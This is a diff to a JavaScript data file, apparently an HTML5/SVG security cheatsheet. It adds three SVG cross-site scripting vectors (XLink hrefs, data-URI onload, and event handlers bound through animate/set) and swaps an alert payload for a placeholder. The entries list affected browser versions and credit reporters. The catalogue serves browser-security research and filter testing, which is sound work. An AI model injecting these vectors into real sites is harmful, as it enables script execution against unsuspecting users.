@@ -2705,7 +2705,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<body oninput=alert(1)><input autofocus>',
+        'data'       : '<body oninput=%js_alert%><input autofocus>',
         'description': {
             'en' : 'All browsers besides Internet Explorer support the "oninput" event handler around form elements like the given <INPUT>. The event works for the form elements itself, the surrounding form and <BODY> as well as <HTML> tags.', 
             'ja' : '',
@@ -2727,5 +2727,96 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'html5', 'oninput', 'form', 'passive', 'event'],
         'reporter'   : 'Skyphire'
+    },
+    { /* ID 87 - SVG simple passive JavaScript execution via XLink */
+        'id'         : 87,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : 'SVG simple passive JavaScript execution via XLink',
+            'ja' : '',
+            'ru' : 'Пассивный скриптинг в SVG c помощью XLink',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="%js_uri_alert%"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',        
+        'description': {
+            'en' : 'Browsers that support SVG, forced to support XLink. The parameter of the attribute "xlink:actuate" for "a" tag is fixed - "onRequest".',
+            'ja' : '',
+            'ru' : 'Браузеры, которые поддерживают SVG, вынуждены поддерживать и XLink, поскольку таким образом реализуются почти все связи. Параметр атрибута "xlink:actuate" тега "a" является фиксированным - "onRequest".',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/SVG11/linking.html', 'http://www.w3.org/TR/SVGTiny12/linking.html'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        }, 
+        'browsers'   : {
+            'chrome' : ['4.0', '5.0', '6.0'],
+            'safari' : ['3.4', '4.x'],
+	    'firefox': ['3.0', '3.5', '3.6', '3.7'],
+	    'opera'  : ['9.x', '10.x']
+        },
+        'tags'       : ['xss', 'svg', 'passive', 'xlink', 'chrome', 'firefox', 'safari', 'opera'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 88 - SVG active JavaScript execution via XLink in Opera */
+        'id'         : 88,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : 'SVG active JavaScript execution via XLink in Opera',
+            'ja' : '',
+            'ru' : 'Активный скриптинг в SVG с помощью XLink для Opera',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n</svg>',        
+        'description': {
+            'en' : 'The content of the xml-links will automatically be included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-tags.',
+            'ja' : '',
+            'ru' : 'Содержимое xml-ссылки автоматически включается в текущий документ. Сочетание предустановленных параметров "onLoad" атрибута "xlink:actuate" и "embed" атрибута "xlink:show" образует потенциально небезопасные SVG-теги.',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+	    'opera'  : ['9.x', '10.x']
+        },
+        'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 89 - SVG events handler injection via animating */
+        'id'         : 89,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : 'SVG events handler injection via animating',
+            'ja' : '',
+            'ru' : 'Инъекция обработчика события в SVG с помощью анимирования',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
+        'description': {
+            'en' : 'Google Chrome and Safari support binding an event handler using elements "set" or "animate".',
+            'ja' : '',
+            'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов "set" или "animate".',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/SVG11/animate.html', 'http://www.w3.org/TR/SVGMobile12/animate.html', '#24', '#28'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'chrome' : ['4.0', '5.0', '6.0'],
+            'safari' : ['3.4', '4.x'],
+        },
+        'tags'       : ['xss', 'svg', 'event', 'safari', 'chrome'],
+        'reporter'   : 'LeverOne'
     }
 ]
